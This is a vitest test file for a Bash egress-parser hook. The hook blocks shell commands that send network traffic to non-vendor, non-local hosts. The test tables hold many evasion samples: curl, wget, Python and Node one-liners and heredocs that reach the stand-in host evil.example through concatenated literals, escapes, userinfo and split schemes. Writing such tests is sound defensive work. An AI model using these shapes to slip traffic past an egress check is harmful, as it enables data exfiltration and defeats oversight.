// Card 44167c0b: concatenated URL literals in interpreter code.
//
// The Bash egress parser read an interpreter's code (a one-liner -c / -e body, a heredoc or here-string
// fed to an interpreter) with URL_RE on the raw quoted text. URL_RE stops at a quote or a backslash, so a
// URL built from adjacent literals (`'https://api.github.com' '.evil.example'`, a shell join of
// `"https://ev"'il.example'`, a split scheme) either showed no URL or showed a vendor / local PREFIX, and
// passed. The invariant under test: network-using interpreter code passes only if every destination in it
// reads as one complete literal host that is local or vendor.
//
// Groups: A = curl / wget argv (already closed, must not change), B / C / D = interpreter code (the gaps),
// K = controls that must stay allowed, X = extra shapes of the invariant (newline, parenthesis, scheme).
import { describe, it, expect } from 'vitest'
// @ts-expect-error -- plain .mjs hook script, no types
import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'

// @ts-expect-error -- plain .mjs fixture module, no types
import { R1_DENY, R1_ALLOW } from './fixtures/egress-corpus/concat-r1-shapes.mjs'

type R1Deny = [string, string, string, string | null, string]
const VENDOR = new Set(['api.github.com'])
const NO_DOMAINS = new Set<string>()
type Decision = { deny: boolean; reason?: string; hosts: string[] }
const run = (cmd: string): Decision => classify(cmd, 0, VENDOR, NO_DOMAINS)
const SQ = "'"

// A: the base decision of the curl / wget argv path (measured on 9d75d5e0, tmp/probe-base.json). AC6.
const CURL_BASE: Array<[string, string, string, string[]]> = [
  ['A01', `curl "https://ev"'il.example'/x`, 'curl-external', ['evil.example']],
  ['A02', `curl https://"evil".example`, 'curl-external', ['evil.example']],
  ['A03', `curl h"ttps://"evil.example`, 'curl-external', ['evil.example']],
  ['A04', `curl $'https://evil.example/x'`, 'raw-ansi-execution-context', []],
  ['A05', `curl ht\\tps://ev\\il.example`, 'curl-external', ['evil.example']],
  ['A06', `curl "https://api.github.com"".evil.example/x"`, 'curl-external', ['api.github.com.evil.example']],
  ['A07', `wget "https://"'evil.example'/f`, 'wget-external', ['evil.example']],
  ['A08', `curl "\${S}://evil.example"`, 'curl-external', ['evil.example']],
  ['A09', `curl "https://\${H:-evil.example}/x"`, 'curl-external', ['<unresolved: ${h>']],
  ['A10', `curl https://api.github.com"\${X}"/x`, 'curl-external', ['<unresolved: api.github.com${x}>']],
  ['A11', `curl -s -X POST "http://localhost"'.evil.example/api'`, 'curl-external', ['localhost.evil.example']],
  ['A12', `for u in "https://ev"'il.example'; do curl -s "$u"; done`, 'curl-external', ['evil.example']],
  ['A13', `curl ev"il.example"/x`, 'curl-external', ['evil.example']],
]

// B / C / D: [id, command, reason, real host that must be in `hosts` (null: only an open-host marker)].
const GAPS: Array<[string, string, string, string | null]> = [
  // B: shell-level concatenation inside an interpreter one-liner
  ['B01', `node -e "fetch('https://ev"'il.example'"/x')"`, 'one-liner-external', 'evil.example'],
  ['B02', `node -e "fetch('https://api.github.com"'.evil.example'"/x')"`, 'one-liner-external', 'api.github.com.evil.example'],
  ['B03', `node -e "fetch('https://"'evil.example'"/')"`, 'one-liner-external', 'evil.example'],
  ['B04', `node -e "fetch('h"ttps://evil.example"')"`, 'one-liner-external', 'evil.example'],
  ['B05', `node -e "fetch('http://localhost"'.evil.example'"/x')"`, 'one-liner-external', 'localhost.evil.example'],
  ['B06', `python3 -c "import urllib.request as u; u.urlopen('https://"evil.example"/x')"`, 'one-liner-external', 'evil.example'],
  ['B07', String.raw`python3 -c import\ urllib.request\ as\ u\;u.urlopen\(\'https://api.github.com\.evil.example\'\)`, 'one-liner-external', 'api.github.com.evil.example'],
  ['D03', `node -e "fetch('https://api.github.com"'@evil.example'"/x')"`, 'one-liner-external', 'evil.example'],
  // C: language-level concatenation / escapes
  ['C01', `python3 -c "import urllib.request as u; u.urlopen('https://api.github.com' '.evil.example')"`, 'one-liner-external', null],
  ['C02', `python3 -c "import urllib.request as u; u.urlopen('https://api.github.com'+'.evil.example')"`, 'one-liner-external', null],
  ['C03', `python3 -c "import urllib.request as u; u.urlopen('ht'+'tps://evil.example')"`, 'one-liner-external', 'evil.example'],
  ['C04', `python3 -c "import urllib.request as u; u.urlopen('https:/'+'/evil.example')"`, 'one-liner-external', null],
  ['C05', `python3 -c 'import urllib.request as u; u.urlopen("https://\\x65vil.example")'`, 'one-liner-external', null],
  ['C06', `node -e "fetch('http://localhost' + '.evil.example/x')"`, 'one-liner-external', null],
  ['C07', `node -e "fetch(\\\`https://\\\${'evil'}.example\\\`)"`, 'one-liner-external', null],
  ['C08', `python3 <<${SQ}EOF${SQ}\nimport urllib.request as u\nu.urlopen('https://api.github.com' '.evil.example')\nEOF`, 'heredoc-external', null],
]

// Denied on the base too (must stay denied): a here-string already unquoted, a percent-encoded host.
const DENIED_TODAY: Array<[string, string, string]> = [
  ['D01', `python3 <<< "import urllib.request as u; u.urlopen('https://api.github.com"'.evil.example'"/x')"`, 'heredoc-external'],
  ['D02', `node -e "fetch('https://api.github.com%2eevil.example/x')"`, 'one-liner-external'],
]

// K: controls, allowed on the base and after. K10 (file:///) is the rule-I4 case; the last four rows are
// the false-positive risk shapes of the spec (R1).
const CONTROLS: Array<[string, string]> = [
  ['K01', `curl -s -H "Authorization: Bearer $(cat /Users/gyorgydecsi/marveen/store/.dashboard-token)" http://localhost:3420/api/kanban`],
  ['K02', `echo "see https://github.com/o/r/pull/1" > /tmp/note.txt`],
  ['K03', `curl -s -X POST http://localhost:3420/api/messages -H "Content-Type: application/json" -d '{"content":"PR: https://github.com/o/r/pull/1"}'`],
  ['K04', `python3 -c "print('https://example.com')"`],
  ['K05', `node -e "fetch('http://localhost:3420/api/health')"`],
  ['K06', `node -e "fetch('http://localhost:3420' + '/api/health')"`],
  ['K07', `python3 -c "import urllib.request as u; u.urlopen('http://127.0.0.1:3420/'+'api/health')"`],
  ['K08', `curl -s "http://localhost:3420"'/api/kanban'`],
  ['K09', `curl -s https://api.github.com/repos/o/r`],
  ['K10', `python3 -c "import urllib.request as u; u.urlopen('file:///tmp/x.json')"`],
  ['K11', `python3 -c "import urllib.request as u; p=3420; u.urlopen(f'http://localhost:{p}/api/health')"`],
  ['L01', `node -e "const p='/api/x'; fetch('http://localhost:3420'+p)"`],
  ['L02', `python3 -c "import urllib.request as u; h={'A': 'b'}; u.urlopen(u.Request('http://127.0.0.1:3420/api', headers=h))"`],
  ['L03', `python3 -c "import urllib.request as u; p=3420; u.urlopen(f'http://localhost:{p}')"`],
  ['L04', `node -e "fetch('http://nas.local:5000/x')"`],
  ['L05', `python3 -c "import urllib.request as u; u.urlopen('http://localhost').read()"`],
  ['L06', `node -e "fetch('https://api.github.com/repos/o/r').then(r => r.json())"`],
  ['L07', `python3 <<'EOF'\nimport urllib.request as u\nbase = 'http://localhost'\nprint(u.urlopen(base).status)\nEOF`],
  ['L08', `python3 -c "import urllib.request as u; u.urlopen('http://[::1]:3420/api/health')"`],
  ['L09', `node -e "fetch('http://localhost:3420/api/' + 'kanban')"`],
  ['L10', `python3 -c "import requests; requests.get('http://127.0.0.1:3420/x', headers={'Authorization': 'Bearer t'}, timeout=5)"`],
  ['L11', `node -e "fetch(\`http://localhost:\${3420}/api/health\`)"`],
  // A lone '://' (split, replace) names no destination; a comment line after a literal is not a continuation.
  ['L12', `python3 -c "import urllib.request as u; p = 'a'.split('://'); u.urlopen('http://localhost:3420/' + p[0])"`],
  ['L13', `python3 <<'EOF'\nimport urllib.request as u\nb = 'http://localhost'\n# fetch it\nu.urlopen(b)\nEOF`],
]

describe('A: curl / wget argv decisions are unchanged (AC6)', () => {
  for (const [id, cmd, reason, hosts] of CURL_BASE) {
    it(`${id} keeps the base decision`, () => {
      expect({ cmd, r: run(cmd) }).toEqual({ cmd, r: { deny: true, reason, hosts } })
    })
  }
})

describe('B / C / D: concatenated destinations in network-using interpreter code deny', () => {
  for (const [id, cmd, reason, host] of GAPS) {
    it(`${id} denies with ${reason}`, () => {
      const r = run(cmd)
      expect({ cmd, deny: r.deny, reason: r.reason }).toEqual({ cmd, deny: true, reason })
      expect(r.hosts.length).toBeGreaterThan(0)
      // AC1 / AC4: where the real host is readable, it is the host the block reports.
      if (host !== null) expect(r.hosts).toContain(host)
    })
  }
  for (const [id, cmd, reason] of DENIED_TODAY) {
    it(`${id} stays denied with ${reason}`, () => {
      const r = run(cmd)
      expect({ cmd, deny: r.deny, reason: r.reason }).toEqual({ cmd, deny: true, reason })
    })
  }
  it('B01 reports the REAL host, not the readable prefix "ev" (AC1)', () => {
    const r = run(GAPS[0][1])
    expect(r.hosts).toContain('evil.example')
    expect(r.hosts).not.toContain('ev')
  })
  it('hosts order: closed external hosts first, open-host markers after (R4)', () => {
    const r = run(GAPS[0][1])
    expect(r.hosts[0]).toBe('evil.example')
    for (const h of r.hosts.slice(1)) expect(h.startsWith('<')).toBe(true)
  })
  it('an open-host marker is never a vendor host, even with a listed vendor prefix (I5)', () => {
    const r = run(GAPS[1][1])
    expect(r.deny).toBe(true)
    expect(r.hosts.some((h: string) => h.startsWith('<'))).toBe(true)
  })
})

describe('K / L: controls and everyday shapes stay allowed (AC5)', () => {
  for (const [id, cmd] of CONTROLS) {
    it(`${id} is allowed`, () => {
      expect({ cmd, r: run(cmd) }).toMatchObject({ cmd, r: { deny: false, hosts: [] } })
    })
  }
})

describe('X: more shapes of the same invariant', () => {
  const DENY: Array<[string, string]> = [
    // A parenthesised vendor literal followed by a continuation.
    ['X01', `python3 -c "import urllib.request as u; u.urlopen(('https://api.github.com')+'.evil.example')"`],
    // Python joins adjacent string literals across a newline inside parentheses.
    ['X02', `python3 <<'EOF'\nimport urllib.request as u\nu.urlopen(('https://api.github.com'\n  '.evil.example'))\nEOF`],
    // JS: a line that starts with + continues the expression.
    ['X03', `node <<'EOF'\nfetch('http://localhost'\n  + '.evil.example')\nEOF`],
    // A scheme split in the middle, with the tail left alone.
    ['X04', `python3 -c "import urllib.request as u; u.urlopen('h'+'ttps:'+'//evil.example')"`],
    // Userinfo hides the real host behind a vendor name, shell-joined.
    ['X05', `python3 -c "import urllib.request as u; u.urlopen('https://api.github.com'\\"@evil.example/x\\")"`],
    // An empty host followed by a concatenation.
    ['X06', `python3 -c "import urllib.request as u; h='evil.example'; u.urlopen('https://'+h)"`],
    // A different scheme than the URL_RE list.
    ['X07', `python3 -c "import urllib.request as u, socket; socket.create_connection(('x', 1)); u.urlopen('redis://evil.example:6379')"`],
    // A heredoc body is not shell-joined: its quotes are literal, the language-level join still denies.
    ['X08', `node <<'EOF'\nfetch('http://127.0.0.1' + '.evil.example/x')\nEOF`],
    // A comment line between the pieces does not end the literal.
    ['X10', `python3 <<'EOF'\nimport urllib.request as u\nu.urlopen(('http://localhost'\n # c\n '.evil.example'))\nEOF`],
    // The scheme separator in its own literal.
    ['X11', `python3 -c "import urllib.request as u; u.urlopen('http'+'://evil.example')"`],
    // A backslash after the host: WHATWG reads it as a slash, so the host is not provably complete.
    ['X12', `python3 -c "import urllib.request as u; u.urlopen('http://localhost\\\\@evil.example/x')"`],
  ]
  for (const [id, cmd] of DENY) {
    it(`${id} denies`, () => {
      const r = run(cmd)
      expect({ cmd, deny: r.deny }).toEqual({ cmd, deny: true })
    })
  }
  it('X09 a newline after a closed local literal is not a continuation (heredoc statement end)', () => {
    const cmd = `python3 <<'EOF'\nimport urllib.request as u\nb = 'http://localhost'\nprint(u.urlopen(b).status)\nEOF`
    expect(run(cmd).deny).toBe(false)
  })
})

describe('AC8: code that does not use the network is not judged by the invariant', () => {
  for (const cmd of [
    `python3 -c "print('https://api.github.com'+'.evil.example')"`,
    `node -e "console.log('http://localhost' + '.evil.example')"`,
    `python3 <<'EOF'\nprint('https://api.github.com' '.evil.example')\nEOF`,
  ]) {
    it(`allows ${cmd.slice(0, 50).replace(/\n/g, ' ')}`, () => {
      expect({ cmd, deny: run(cmd).deny }).toEqual({ cmd, deny: false })
    })
  }
})

// Fix round 1 (security review B1-B5). The shapes live in fixtures/egress-corpus/concat-r1-shapes.mjs, the
// same list the corpus rows (concat.jsonl, CC-R1-*) are generated from.
//   B1 a literal continuation behind the PORT (`'http://localhost:3420' + '@evil.example'`)
//   B2 TAB / CR / LF never close a host (WHATWG URL deletes them)
//   B3 the scheme split over literals (`'http' + ':' + '//evil.example'`)
//   B4 the shell's closing quote behind `)` is not a string continuation (over-block)
//   B5 backslash-newline joins lines only behind an ODD run of backslashes (pre-existing)
describe('R1: shapes of the security review deny with the reported host or marker', () => {
  for (const [id, , cmd, reason, host] of R1_DENY as R1Deny[]) {
    it(`${id} denies`, () => {
      const r = run(cmd)
      expect({ cmd, deny: r.deny }).toEqual({ cmd, deny: true })
      if (reason !== null) expect(r.reason).toBe(reason)
      expect({ cmd, hosts: r.hosts.filter((h: string) => h.includes(host as string)).length > 0 }).toEqual({ cmd, hosts: true })
    })
  }
})

describe('R1: shapes that must stay allowed', () => {
  for (const [id, , cmd] of R1_ALLOW as Array<[string, string, string]>) {
    it(`${id} is allowed`, () => {
      expect({ cmd, r: run(cmd) }).toMatchObject({ cmd, r: { deny: false, hosts: [] } })
    })
  }
})

describe('R1: B2 and B4 details', () => {
  it('B2: a host that goes on after TAB, CR or LF is reported open, not as the readable prefix', () => {
    const r = run(R1_DENY.find((x: unknown[]) => x[0] === 'B2a')![2] as string)
    expect(r.hosts.every((h: string) => h.startsWith('<open host: api.github.com'))).toBe(true)
  })
  it('B4: a grouped vendor literal that is continued still denies, behind the shell quote too', () => {
    const cmd = `node -e "fetch(('https://api.github.com') + '.evil.example')"`
    expect({ cmd, deny: run(cmd).deny }).toEqual({ cmd, deny: true })
  })
  it('B3: a protocol-relative tail literal in network code is a split scheme', () => {
    const cmd = `python3 -c "import urllib.request as u; u.urlopen('http:'+'//evil.example')"`
    expect(run(cmd).hosts).toContain('<split scheme>')
  })
})

describe('AC7: ambiguous shell syntax in network-using one-liner code denies', () => {
  it('denies a one-liner whose code holds $$\'', () => {
    const cmd = `python3 -c "import urllib.request as u; u.urlopen('http://localhost:3420/x')" $$'x'`
    const r = run(cmd)
    expect({ cmd, deny: r.deny }).toEqual({ cmd, deny: true })
  })
})
